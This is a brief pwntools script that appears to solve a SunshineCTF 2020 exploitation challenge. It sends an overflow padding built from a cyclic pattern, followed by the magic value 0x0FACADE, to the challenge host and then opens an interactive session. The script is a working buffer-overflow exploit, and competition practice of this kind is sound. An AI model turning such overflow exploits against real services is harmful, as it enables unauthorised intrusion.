from pwn import *

p = remote("chal.2020.sunshinectf.org", 30000)

p.sendline(cyclic(cyclic_find("paaaqaaaraaasaaata")) + p32(0x0FACADE))

p.interactive()
